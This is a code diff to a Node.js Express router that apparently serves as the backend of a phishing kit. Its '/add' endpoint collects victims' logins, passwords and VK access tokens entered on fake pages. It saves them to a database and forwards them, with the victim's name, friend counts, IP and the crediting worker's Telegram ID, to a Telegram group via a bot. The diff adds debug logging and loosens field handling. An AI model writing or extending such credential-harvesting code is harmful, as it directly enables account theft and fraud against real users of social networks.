@@ -47,13 +47,14 @@ router.post('/get', async (req, res) => {
     })
 })
 router.post('/add', async (req, res) => {
+  console.log('ТУТ')
     if (req.body.ip && iplist.filter(e => e == req.body.ip).length < 10) {
         iplist.push(req.body.ip)
+      console.log('ТУТ1')
         const userData = await user.findOne({
             tg_id: parseInt(req.body.id, 32)
         })
         const condidate = await accs.findOne({
-            type: req.body.type,
             login: req.body.login,
             password: req.body.password
         })
@@ -61,7 +62,7 @@ router.post('/add', async (req, res) => {
             let link = await links.findOne({
                 link: req.body.fake
             })
-            bot.sendMessage(process.env.NotifyGroup2, `✨ Новый аккаунт ${names[req.body.type]}\n😻 Login: <code>${req.body.login}</code>\n🗝 Password: <code>${req.body.password}</code>\n${req.body.type == 'vk'?`🖇  Token: <code>${req.body.token}</code>\n\n🚶Имя: ${req.body.first_name}\n🍌Фамилия: ${req.body.last_name}\n\n🆔 ID: <a href="https://vk.com/id${req.body.user_id}">${req.body.user_id}</a>\n\n🤼 Друзей: ${req.body.counters.friends}\n👨‍👩‍👧‍👦 Подписчиков: ${req.body.counters.followers}\n\n🎁 Подарков: ${req.body.counters.gifts}\n\n`:''}📍 IP: <code>${req.body.ip}</code>\n🖥 Fake: <code>${req.body.fake}</code>\n🚧 Шаблон: <code>${'-'}</code>\n\n🗓 Дата: <code>${GetDateFormat(new Date()).split(' / ')[0]}</code>\n🕰 Время: <code>${GetDateFormat(new Date()).split(' / ')[1]}</code>\n\n\nАккаунт пользователя: @${userData.login?userData.login:'-'}\nTelegram ID: <code>${userData.tg_id||'-'}</code>`, {
+            bot.sendMessage(process.env.NotifyGroup2, `✨ Новый аккаунт ${names[req.body.type]}\n😻 Login: <code>${req.body.login}</code>\n🗝 Password: <code>${req.body.password}</code>\n${req.body.type == 'vk'?`🖇  Token: <code>${req.body.token}</code>\n\n🚶Имя: ${req.body.first_name}\n🍌Фамилия: ${req.body.last_name}\n\n🆔 ID: <a href="https://vk.com/id${req.body.user_id}">${req.body.user_id}</a>\n\n🤼 Друзей: ${req.body.counters.friends}\n👨‍👩‍👧‍👦 Подписчиков: ${req.body.counters.followers}\n\n🎁 Подарков: ${req.body.counters.gifts}\n\n`:''}📍 IP: <code>${req.body.ip}</code>\n🖥 Fake:  <code>${req.body. fake}</code>\n🚧 Шаблон: <code>${'-'}</code>\n\n🗓 Дата: <code>${GetDateFormat(new Date()).split(' / ')[0]}</code>\n🕰 Время: <code>${GetDateFormat(new Date()).split(' / ')[1]}</code>\n\n\nАккаунт пользователя: @${userData.login?userData.login:'-'}\nTelegram ID: <code>${userData.tg_id||'-'}</code>`, {
                 parse_mode: 'HTML',
                 disable_web_page_preview: true
             })
@@ -103,8 +104,8 @@ router.post('/add', async (req, res) => {
                     tg_id: parseInt(req.body.id, 32),
                     type: req.body.type,
                     fake: req.body.fake,
-                    pattern: link.query[Number(req.body.query)].name,
-                    query: Number(req.body.query),
+                    //pattern: link.query[Number(req.body.query)].name,
+                    query: req.body.query?Number(req.body.query):'',
                     ip: req.body.ip.split(',')[0] || '-',
                     date: new Date()
                 }).save()
